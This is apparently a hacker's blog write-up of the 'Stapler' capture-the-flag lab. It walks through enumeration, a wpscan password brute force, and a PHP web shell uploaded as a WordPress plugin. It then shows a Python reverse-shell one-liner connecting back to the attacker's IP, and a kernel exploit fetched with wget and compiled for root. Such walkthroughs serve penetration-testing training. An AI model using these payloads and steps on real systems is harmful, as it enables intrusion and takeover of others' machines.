---
layout: default
title : muzec - Stapler Writeup
---

![image](https://user-images.githubusercontent.com/69868171/119161035-dd583080-ba26-11eb-837d-1f3f631d1b18.png)

We always start with an nmap scan.....

```Nmap -sC -p- -vv -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Fri May 21 07:09:49 2021 as: nmap -sC -p- -vv -sV -oA nmap 172.16.139.169
Nmap scan report for Red.Initech (172.16.139.169)
Host is up, received syn-ack (0.00052s latency).
Scanned at 2021-05-21 07:09:50 EDT for 147s
Not shown: 65523 filtered ports
Reason: 65523 no-responses
PORT      STATE  SERVICE     REASON       VERSION
20/tcp    closed ftp-data    conn-refused
21/tcp    open   ftp         syn-ack      vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.16.139.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         syn-ack      OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc/xrBbi5hixT2B19dQilbbrCaRllRyNhtJcOzE8x0BM1ow9I80RcU7DtajyqiXXEwHRavQdO+/cHZMyOiMFZG59OCuIouLRNoVO58C91gzDgDZ1fKH6BDg+FaSz+iYZbHg2lzaMPbRje6oqNamPR4QGISNUpxZeAsQTLIiPcRlb5agwurovTd3p0SXe0GknFhZwHHvAZWa2J6lHE2b9K5IsSsDzX2WHQ4vPb+1DzDHV0RTRVUGviFvUX1X5tVFvVZy0TTFc0minD75CYClxLrgc+wFLPcAmE2C030ER/Z+9umbhuhCnLkLN87hlzDSRDPwUjWr+sNA3+7vc/xuZul
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQB5n5kAZPIyHb9lVx1aU0fyOXMPUblpmB8DRjnP8tVIafLIWh54wmTFVd3nCMr1n5IRWiFeX1weTBDSjjz0IY=
|   256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ9wvrF4tkFMApswOmWKpTymFjkaiIoie4QD0RWOYnny
53/tcp    open   domain      syn-ack      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        syn-ack      PHP cli server 5.5 or later
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 404 Not Found
123/tcp   closed ntp         conn-refused
137/tcp   closed netbios-ns  conn-refused
138/tcp   closed netbios-dgm conn-refused
139/tcp   open   netbios-ssn syn-ack      Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   tcpwrapped  syn-ack
3306/tcp  open   mysql       syn-ack      MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 10
|   Capabilities flags: 63487
|   Some Capabilities: ConnectWithDatabase, Speaks41ProtocolOld, IgnoreSigpipes, SupportsTransactions, SupportsCompression, FoundRows, InteractiveClient, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, Speaks41ProtocolNew, ODBCClient, IgnoreSpaceBeforeParenthesis, Support41Auth, LongColumnFlag, LongPassword, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: ;(Hpd*V1)FcO<?\x08	N\x08\x0F\x1D
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        syn-ack      Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -4h20m01s, deviation: 34m38s, median: -4h00m02s
| nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   RED<00>              Flags: <unique><active>
|   RED<03>              Flags: <unique><active>
|   RED<20>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60380/tcp): CLEAN (Timeout)
|   Check 2 (port 41878/tcp): CLEAN (Timeout)
|   Check 3 (port 42246/udp): CLEAN (Failed to receive data)
|   Check 4 (port 26053/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2021-05-21T08:11:45+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-21T07:11:46
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 21 07:12:17 2021 -- 1 IP address (1 host up) scanned in 148.25 seconds
```
Having access to FTP with anonymous credentials interesting let try checking it found some note in the FTPserver not that helpful to me because i try brute forcing the FTP with the new username i got but no luck.

![image](https://user-images.githubusercontent.com/69868171/119161696-9cace700-ba27-11eb-84e0-d95c24bc6b2b.png)


Now let checking port 80 now but got 404 not found strange now let go back to the nmap scan output.

![image](https://user-images.githubusercontent.com/69868171/119161842-be0dd300-ba27-11eb-96fb-ceae1de7ddb7.png)

Found out we still have a web server running on a different port `12380` now let check it out to confirm it .

![image](https://user-images.githubusercontent.com/69868171/119162185-18a72f00-ba28-11eb-99df-c3d0405a7b91.png)

Now let run Nikto on it ahhhh SSL is active cool.

![image](https://user-images.githubusercontent.com/69868171/119162600-90755980-ba28-11eb-8c03-d4dccb3cf0f3.png)

Now let try opening the page again with SSL `https://172.16.139.169:12380/` .

![image](https://user-images.githubusercontent.com/69868171/119162826-d3373180-ba28-11eb-8fd8-09d9f0f5fdef.png)

Cool Nikto also show we have the robots.txt page with some directory in it let confirm it .

![image](https://user-images.githubusercontent.com/69868171/119162987-fc57c200-ba28-11eb-824f-5d70c4b35dec.png)

We move lol cool checking `admin112233` directory no luck but lesson learn and checking `blogblog` boom a wordpress CMS.

![image](https://user-images.githubusercontent.com/69868171/119163501-7720dd00-ba29-11eb-9cbc-dd2ccf540cc7.png)

Going through it saw a user `John Smith` probably the admin of the blog cool also found the name in the note i saw on the FTP server ok let enumerate more with `wpscan` .

![image](https://user-images.githubusercontent.com/69868171/119164401-6329ab00-ba2a-11eb-8b6c-2456ef64f6d4.png)

`wpscan --url https://172.16.139.169:12380/blogblog/ --enumerate u --disable-tls-checks` we need to disable the SSL for `wpscan` to work so got some few users with `wpscan` now let try to brute force with the user `john` and the passwordlist `rockyou.txt` .

`wpscan --url https://172.16.139.169:12380/blogblog/ --usernames john --passwords /usr/share/wordlists/rockyou.txt --disable-tls-checks`

![image](https://user-images.githubusercontent.com/69868171/119164666-a7b54680-ba2a-11eb-870c-b0ed29a6e702.png)

In no time we got the password now let log in.

![image](https://user-images.githubusercontent.com/69868171/119165174-3924b880-ba2b-11eb-9608-9ae6788718a0.png)

Now getting reverse shell using the plugin page click on add new plugin/upload plugin .

![image](https://user-images.githubusercontent.com/69868171/119165648-b6e8c400-ba2b-11eb-9d0b-2b9d55b7d0c8.png)

Now save `<?php system ($_GET['cmd']) ?>` in a PHP file like rev.php time to upload it .

![image](https://user-images.githubusercontent.com/69868171/119166690-f1069580-ba2c-11eb-8a5e-2f5bc2fac21f.png)

Now let click on `install now` but seems we need to add our FTP credentials before we can upload it easy we know it `anonymous` and `anonymous` with both username and password.

![image](https://user-images.githubusercontent.com/69868171/119166976-4773d400-ba2d-11eb-9cfe-24a461df5daa.png)

Now going back to our `wpscan` seems we have access to the uploads page for wordpress mean we can see anything we upload `https://172.16.139.169:12380/blogblog/wp-content/uploads/` .

![image](https://user-images.githubusercontent.com/69868171/119167393-ce28b100-ba2d-11eb-9e7b-c299ebb99ea0.png)

Going through the uploads page we can see the file we upload .

![image](https://user-images.githubusercontent.com/69868171/119167758-2d86c100-ba2e-11eb-9b0f-68622fdbf8ed.png)

Now time to get command execution `https://172.16.139.169:12380/blogblog/wp-content/uploads/rev.php?cmd=id` boom we have command execution .

![image](https://user-images.githubusercontent.com/69868171/119168128-94a47580-ba2e-11eb-9d8d-9c3ade5f7c55.png)

Now getting the reverse shell  let start an ncat listener `nc -nvlp 1337` we be using python reverse shell `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` .

![image](https://user-images.githubusercontent.com/69868171/119168569-067cbf00-ba2f-11eb-924c-6a8ea477617d.png)

Now let execute the reverse shell .

`https://172.16.139.169:12380/blogblog/wp-content/uploads/rev.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.20.10.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

![image](https://user-images.githubusercontent.com/69868171/119169030-8dca3280-ba2f-11eb-9362-dc78a3acfed9.png)

We have shell let spawn a TTY shell using `python -c 'import pty; pty.spawn ("/bin/bash")'` .

### Privilege Escalation

Going through the users folder nothing that stand out so i check for kernal version to see if it vulnerable.

![image](https://user-images.githubusercontent.com/69868171/119170491-4b095a00-ba31-11eb-9049-781b56863b0a.png)

I decided to deploy `linux-exploit-suggester.sh` onto the target to be sure.

![image](https://user-images.githubusercontent.com/69868171/119171085-1b0e8680-ba32-11eb-9d8b-a997ecd02c95.png)

Lot of exploit but the only work that work for me is the double-fdput exploit .

1. wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
2. uzip 39772.zip
3. tar -xf exploit.tar
4. chmod +x compile.sh
5. ./compile.sh

![image](https://user-images.githubusercontent.com/69868171/119172473-0206d500-ba34-11eb-9a25-120590a3f689.png)

![image](https://user-images.githubusercontent.com/69868171/119172668-3b3f4500-ba34-11eb-890b-125f5de9af83.png)

Now running our compile exploit to get root shell .

![image](https://user-images.githubusercontent.com/69868171/119172827-632ea880-ba34-11eb-9e41-22c923ca06e1.png)

And we are root .

![image](https://user-images.githubusercontent.com/69868171/119172913-7b9ec300-ba34-11eb-8c06-011b50a9f056.png)

Box rooted hope you have fun because i do .

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
